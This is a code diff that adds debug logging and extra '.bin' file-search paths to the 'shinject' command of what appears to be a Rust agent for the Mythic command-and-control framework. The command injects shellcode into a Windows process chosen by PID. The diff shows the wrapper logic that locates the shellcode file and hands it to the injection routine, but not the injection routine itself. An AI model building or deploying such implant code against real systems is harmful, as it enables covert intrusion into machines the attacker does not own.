@@ -71,27 +71,49 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn E
 /// Main command execution function
 #[cfg(target_os = "windows")]
 pub fn execute_shinject(args: ShinjectArgs, task_id: &str) -> Result<String, String> {
+    eprintln!("DEBUG: Starting shinject execution for task {}", task_id);
+    eprintln!("DEBUG: Target PID: {}", args.pid);
+    eprintln!("DEBUG: Shellcode file ID: {}", args.shellcode_file_id);
+    
     // FIX: Get shellcode via RPC from Mythic (this would need RPC integration)
     // For now, we'll assume the file is automatically downloaded by Mythic
+    eprintln!("DEBUG: Attempting to get shellcode from Mythic");
     let shellcode_bytes = match get_shellcode_from_mythic(&args.shellcode_file_id, task_id) {
-        Ok(bytes) => bytes,
-        Err(e) => return Err(e),
+        Ok(bytes) => {
+            eprintln!("DEBUG: Successfully retrieved shellcode, size: {} bytes", bytes.len());
+            bytes
+        },
+        Err(e) => {
+            eprintln!("DEBUG: Failed to get shellcode: {}", e);
+            return Err(e);
+        },
     };
 
     // Validate shellcode size
     if shellcode_bytes.is_empty() {
+        eprintln!("DEBUG: Shellcode file is empty");
         return Err("Shellcode file is empty".to_string());
     }
 
     // Check if process exists
+    eprintln!("DEBUG: Checking if process {} exists", args.pid);
     if !process_exists(args.pid) {
+        eprintln!("DEBUG: Process {} does not exist", args.pid);
         return Err(format!("No process with PID {} is running", args.pid));
     }
+    eprintln!("DEBUG: Process {} exists, proceeding with injection", args.pid);
 
     unsafe {
+        eprintln!("DEBUG: Starting shellcode injection into process {}", args.pid);
         match inject_shellcode_impl(args.pid, &shellcode_bytes) {
-            Ok(output) => Ok(output),
-            Err(e) => Err(e),
+            Ok(output) => {
+                eprintln!("DEBUG: Shellcode injection successful: {}", output);
+                Ok(output)
+            },
+            Err(e) => {
+                eprintln!("DEBUG: Shellcode injection failed: {}", e);
+                Err(e)
+            },
         }
     }
 }
@@ -115,6 +137,8 @@ fn process_exists(pid: u32) -> bool {
 /// Get shellcode file content - placeholder for Mythic RPC integration
 #[cfg(target_os = "windows")]
 fn get_shellcode_from_mythic(file_id: &str, _task_id: &str) -> Result<Vec<u8>, String> {
+    eprintln!("DEBUG: Looking for shellcode file with ID: {}", file_id);
+    
     // FIX: This is a placeholder - in a real implementation, you would use Mythic RPC
     // to download the file. For now, we'll use a simple file search approach.
     
@@ -122,20 +146,28 @@ fn get_shellcode_from_mythic(file_id: &str, _task_id: &str) -> Result<Vec<u8>, S
         std::env::current_dir().map(|p| p.join(file_id)).unwrap_or_default(),
         std::env::temp_dir().join(file_id),
         std::path::Path::new(file_id).to_path_buf(),
+        // Also check with .bin extension (common for shellcode)
+        std::env::current_dir().map(|p| p.join(format!("{}.bin", file_id))).unwrap_or_default(),
+        std::env::temp_dir().join(format!("{}.bin", file_id)),
     ];
     
+    eprintln!("DEBUG: Searching for shellcode file in {} possible locations", possible_paths.len());
+    
     // Try to find and read the file
-    for path in &possible_paths {
+    for (i, path) in possible_paths.iter().enumerate() {
+        eprintln!("DEBUG: Checking location {}: {} (exists: {})", i + 1, path.display(), path.exists());
         if path.exists() {
             match std::fs::read(path) {
                 Ok(bytes) => {
                     if !bytes.is_empty() {
-                        println!("DEBUG: Found shellcode file at {} ({} bytes)", path.display(), bytes.len());
+                        eprintln!("DEBUG: Found shellcode file at {} ({} bytes)", path.display(), bytes.len());
                         return Ok(bytes);
+                    } else {
+                        eprintln!("DEBUG: File {} exists but is empty", path.display());
                     }
                 }
                 Err(e) => {
-                    println!("DEBUG: Failed to read file {}: {}", path.display(), e);
+                    eprintln!("DEBUG: Failed to read file {}: {}", path.display(), e);
                     continue;
                 }
             }
